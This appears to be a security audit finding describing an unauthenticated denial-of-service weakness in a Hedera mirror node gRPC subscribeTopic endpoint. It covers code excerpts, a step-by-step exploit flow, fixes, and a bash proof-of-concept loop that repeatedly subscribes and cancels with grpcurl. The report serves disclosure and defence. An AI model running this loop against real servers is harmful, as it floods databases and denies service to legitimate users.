### Title
Unauthenticated Repeated Historical Subscription DoS via Non-Interruptible Blocking DB Queries

### Summary
Any unauthenticated external client can call `subscribeTopic` with `startTime=0` (epoch), triggering a blocking JDBC `getResultList()` call against the full `topic_message` table history. Because `getResultList()` is synchronous and cannot be interrupted by reactive cancellation, immediately cancelling the gRPC stream via the cancel mechanism does not abort the in-flight DB query. Repeating this subscribe-cancel cycle rapidly — across multiple connections — causes sustained, unthrottled DB load with no application-level protection.

### Finding Description

**Entry point** — `ConsensusController.subscribeTopic()` (lines 43–52):

```java
final var disposable = Mono.fromCallable(() -> toFilter(request))
        .flatMapMany(topicMessageService::subscribeTopic)
        ...
        .subscribe(...);

if (responseObserver instanceof ServerCallStreamObserver s) {
    s.setOnCancelHandler(disposable::dispose);
}
```

The cancel handler calls `disposable::dispose`, which signals cancellation to the Reactor chain. However, this cannot interrupt a blocking call already executing on a scheduler thread.

**No minimum startTime bound** — `TopicMessageFilter.isValidStartTime()` (lines 48–50):

```java
public boolean isValidStartTime() {
    return startTime <= DomainUtils.now();
}
```

Only an upper bound is enforced. `startTime=0` (Unix epoch, nanoseconds) is fully valid.

**Historical retrieval starts immediately** — `TopicMessageServiceImpl.subscribeTopic()` (line 63):

```java
Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
```

This is eagerly composed into the flux and begins executing as soon as the subscription is established.

**Blocking, non-interruptible DB query** — `TopicMessageRepositoryCustomImpl.findByFilter()` (line 60):

```java
return typedQuery.getResultList().stream();
```

The comment in the code itself acknowledges `getResultStream()`'s cursor doesn't work with reactive streams, so `getResultList()` is used instead. This is a fully blocking JDBC call that loads up to `maxPageSize` (default 1000) rows into memory. Once this call is dispatched to the `boundedElastic` scheduler thread, `disposable::dispose` cannot interrupt it — the JDBC query runs to completion regardless of client cancellation.

**No gRPC-level rate limiting** — `GrpcConfiguration` only sets:

```java
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection()); // default: 5
```

There is no per-IP connection limit, no subscription creation rate limit, and no global subscriber cap enforced before the DB query fires. The throttling infrastructure (`ThrottleManagerImpl`, `bucket4j`) exists only in the `web3` module and is entirely absent from the `grpc` module.

**Exploit flow**:
1. Attacker opens M TCP connections to the gRPC port (no connection-per-IP limit).
2. On each connection, attacker sends up to 5 concurrent `subscribeTopic` RPCs with `topicID=<any valid topic>`, `consensusStartTime={seconds:0, nanos:0}`, no `limit`.
3. Each subscription immediately dispatches a blocking `getResultList()` for up to 1000 rows starting from epoch 0 on a `boundedElastic` thread.
4. Attacker sends RST/cancel immediately — `disposable::dispose` fires but the in-flight JDBC query is not cancelled.
5. Attacker re-subscribes on the same connection slot. Each cycle guarantees at least one full 1000-row DB query.
6. With M connections × 5 slots × high cycle rate, the attacker drives continuous parallel DB queries with no application-level gate.

### Impact Explanation

Each subscribe-cancel cycle forces a full index scan of `topic_message` from timestamp 0 for the given topic, returning up to 1000 rows per page, with results materialized into heap memory via `getResultList()`. At high cycle rates across multiple connections, this saturates the PostgreSQL connection pool, increases I/O and CPU on the DB host, and degrades or denies service to legitimate subscribers. The `boundedElastic` scheduler provides soft back-pressure but is not a security control — its default queue depth (200,000 tasks) means the attacker can pre-fill the queue before any natural throttling occurs.

### Likelihood Explanation

No authentication is required. The gRPC port is publicly exposed. A standard gRPC client library (e.g., `grpcurl`, any language SDK) is sufficient. The attack requires no special knowledge beyond the protobuf schema (publicly documented). The cycle can be automated trivially in a loop. The per-connection call limit of 5 is bypassed by opening additional TCP connections, which is unrestricted.

### Recommendation

1. **Enforce a minimum `startTime` window**: Reject subscriptions where `startTime` is older than a configurable maximum lookback (e.g., 7 days), or require an explicit `endTime` when `startTime` is historical.
2. **Add gRPC-level rate limiting**: Implement a per-IP or global subscription-creation rate limiter (e.g., bucket4j, similar to the web3 module) in `ConsensusController` before the subscription is established.
3. **Replace `getResultList()` with a cursor/streaming query**: Use a server-side cursor or `ScrollableResults` so that reactive cancellation can propagate to the DB layer and abort in-flight queries.
4. **Enforce a global maximum concurrent subscriber count**: Reject new subscriptions when `subscriberCount` exceeds a configured ceiling, not just track it as a metric.
5. **Limit connections per IP** at the Netty/load-balancer level.

### Proof of Concept

```bash
# Requires grpcurl and the mirror node proto files

# Step 1: Subscribe with epoch startTime and immediately cancel (repeat in a tight loop)
for i in $(seq 1 500); do
  grpcurl -plaintext \
    -d '{"topicID":{"topicNum":1001},"consensusStartTime":{"seconds":0,"nanos":0}}' \
    <mirror-node-host>:5600 \
    com.hedera.mirror.api.proto.ConsensusService/subscribeTopic &
  sleep 0.01
  kill %1 2>/dev/null   # cancel immediately via SIGPIPE / connection close
done

# Step 2: Observe DB query load via pg_stat_activity:
# SELECT count(*), query FROM pg_stat_activity
# WHERE query LIKE '%topic_message%'
# GROUP BY query;
# Expected: dozens of concurrent identical historical scans from timestamp 0
```

Each iteration triggers a blocking `getResultList()` on the `topic_message` table from `consensusTimestamp >= 0`, fetching 1000 rows, which cannot be aborted by the gRPC cancel signal.
